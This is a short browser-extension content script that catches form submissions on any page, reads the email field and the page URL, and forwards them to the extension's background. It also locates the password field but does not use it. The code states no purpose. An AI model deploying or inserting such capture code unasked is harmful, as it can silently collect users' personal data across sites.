document.addEventListener('submit', function (event) {
    const form = event.target;
    const emailInput = form.querySelector('input[type="email"]'); // Adjust selector as needed
    const passwordInput = form.querySelector('input[type="password"]'); // Detects login forms

    if (emailInput) {
        const email = emailInput.value;
        const url = window.location.href;

        chrome.runtime.sendMessage({
            type: 'form_submission',
            email: email,
            url: url
        });
    }
});